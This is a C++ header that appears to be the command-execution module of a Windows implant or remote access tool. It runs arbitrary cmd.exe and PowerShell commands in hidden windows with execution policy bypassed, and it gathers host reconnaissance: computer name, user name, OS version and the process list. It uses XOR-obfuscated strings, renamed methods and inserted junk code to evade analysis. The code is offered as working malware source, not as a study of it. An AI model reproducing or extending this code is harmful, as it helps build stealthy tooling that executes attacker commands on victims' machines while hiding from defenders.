#pragma once
#include "obfuscation.h"
#include <windows.h>
#include <string>
#include <sstream>
#include <memory>

namespace obf = obfuscated;

// Obfuscated command strings
constexpr auto CMD_EXE = OBF_STRING("cmd.exe");
constexpr auto POWERSHELL_EXE = OBF_STRING("powershell.exe");
constexpr auto CMD_FLAG = OBF_STRING("/c");
constexpr auto PS_FLAGS = OBF_STRING("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command");
constexpr auto SUCCESS_PREFIX = OBF_STRING("[+] ");
constexpr auto ERROR_PREFIX = OBF_STRING("[-] ");
constexpr auto INFO_PREFIX = OBF_STRING("[*] ");

class CommandExecutor {
private:
    obf::XOREncoder encoder;

    // Obfuscated method names
    std::string OBF_FUNC_NAME(execute_cmd)(const std::string& command);
    std::string OBF_FUNC_NAME(execute_powershell)(const std::string& command);
    std::string OBF_FUNC_NAME(execute_with_createprocess)(const std::string& cmd_line);
    bool OBF_FUNC_NAME(is_powershell_command)(const std::string& command);
    std::string OBF_FUNC_NAME(sanitize_command)(const std::string& command);

public:
    CommandExecutor();
    ~CommandExecutor();

    std::string execute(const std::string& command);
    std::string get_system_info();
    std::string list_processes();
    std::string get_current_directory();
    bool change_directory(const std::string& path);
};

// Implementation
CommandExecutor::CommandExecutor() {
    obf::insert_junk_code();
}

CommandExecutor::~CommandExecutor() {
    obf::insert_junk_code();
}

bool CommandExecutor::OBF_FUNC_NAME(is_powershell_command)(const std::string& command) {
    std::string lower_cmd = command;
    std::transform(lower_cmd.begin(), lower_cmd.end(), lower_cmd.begin(), ::tolower);

    return lower_cmd.find("get-") == 0 ||
           lower_cmd.find("set-") == 0 ||
           lower_cmd.find("invoke-") == 0 ||
           lower_cmd.find("new-") == 0 ||
           lower_cmd.find("$") != std::string::npos;
}

std::string CommandExecutor::OBF_FUNC_NAME(sanitize_command)(const std::string& command) {
    std::string sanitized = command;

    // Remove potentially dangerous sequences (basic sanitization)
    std::vector<std::string> dangerous = {"&", "|", ">", "<", "^"};
    for (const auto& danger : dangerous) {
        size_t pos = 0;
        while ((pos = sanitized.find(danger, pos)) != std::string::npos) {
            sanitized.replace(pos, danger.length(), "");
            pos += 1;
        }
    }

    return sanitized;
}

std::string CommandExecutor::OBF_FUNC_NAME(execute_with_createprocess)(const std::string& cmd_line) {
    obf::insert_junk_code();

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return ERROR_PREFIX.decrypt() + "Failed to create pipe";
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;

    obf::StackString<512> command_line(cmd_line.c_str());

    BOOL success = CreateProcessA(
        NULL,
        const_cast<char*>(command_line.c_str()),
        NULL, NULL, TRUE, CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    );

    CloseHandle(hWrite);

    if (!success) {
        CloseHandle(hRead);
        return ERROR_PREFIX.decrypt() + "Failed to execute command";
    }

    // Read output
    std::string output;
    char buffer[4096];
    DWORD bytes_read;

    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytes_read, NULL) && bytes_read > 0) {
        buffer[bytes_read] = '\0';
        output += buffer;
        obf::insert_junk_code();
    }

    WaitForSingleObject(pi.hProcess, 5000); // 5 second timeout
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return output.empty() ? INFO_PREFIX.decrypt() + "Command executed successfully" : output;
}

std::string CommandExecutor::OBF_FUNC_NAME(execute_cmd)(const std::string& command) {
    auto cmd_exe = CMD_EXE.decrypt();
    auto cmd_flag = CMD_FLAG.decrypt();
    auto sanitized = OBF_FUNC_NAME(sanitize_command)(command);

    std::string full_command = cmd_exe + " " + cmd_flag + " " + sanitized;
    return OBF_FUNC_NAME(execute_with_createprocess)(full_command);
}

std::string CommandExecutor::OBF_FUNC_NAME(execute_powershell)(const std::string& command) {
    auto ps_exe = POWERSHELL_EXE.decrypt();
    auto ps_flags = PS_FLAGS.decrypt();
    auto sanitized = OBF_FUNC_NAME(sanitize_command)(command);

    std::string full_command = ps_exe + " " + ps_flags + " \"" + sanitized + "\"";
    return OBF_FUNC_NAME(execute_with_createprocess)(full_command);
}

std::string CommandExecutor::execute(const std::string& command) {
    if (command.empty()) {
        return ERROR_PREFIX.decrypt() + "Empty command";
    }

    obf::insert_junk_code();

    // Check for special commands
    if (command == "pwd" || command == "cd") {
        return get_current_directory();
    }

    if (command.substr(0, 3) == "cd ") {
        std::string path = command.substr(3);
        return change_directory(path) ?
            SUCCESS_PREFIX.decrypt() + "Directory changed" :
            ERROR_PREFIX.decrypt() + "Failed to change directory";
    }

    if (command == "ps" || command == "tasklist") {
        return list_processes();
    }

    if (command == "sysinfo" || command == "systeminfo") {
        return get_system_info();
    }

    // Execute based on command type
    if (OBF_FUNC_NAME(is_powershell_command)(command)) {
        return OBF_FUNC_NAME(execute_powershell)(command);
    } else {
        return OBF_FUNC_NAME(execute_cmd)(command);
    }
}

std::string CommandExecutor::get_current_directory() {
    char buffer[MAX_PATH];
    DWORD result = GetCurrentDirectoryA(MAX_PATH, buffer);

    if (result == 0) {
        return ERROR_PREFIX.decrypt() + "Failed to get current directory";
    }

    return INFO_PREFIX.decrypt() + "Current directory: " + std::string(buffer);
}

bool CommandExecutor::change_directory(const std::string& path) {
    obf::insert_junk_code();
    return SetCurrentDirectoryA(path.c_str()) != 0;
}

std::string CommandExecutor::list_processes() {
    return OBF_FUNC_NAME(execute_cmd)("tasklist /fo csv");
}

std::string CommandExecutor::get_system_info() {
    std::stringstream info;

    // Get computer name
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    if (GetComputerNameA(computer_name, &size)) {
        info << INFO_PREFIX.decrypt() << "Computer: " << computer_name << "\n";
    }

    // Get username
    char username[256];
    size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        info << INFO_PREFIX.decrypt() << "User: " << username << "\n";
    }

    // Get OS version
    OSVERSIONINFOA os_info;
    os_info.dwOSVersionInfoSize = sizeof(os_info);
    if (GetVersionExA(&os_info)) {
        info << INFO_PREFIX.decrypt() << "OS Version: "
             << os_info.dwMajorVersion << "."
             << os_info.dwMinorVersion << "."
             << os_info.dwBuildNumber << "\n";
    }

    // Get current directory
    info << get_current_directory() << "\n";

    return info.str();
}
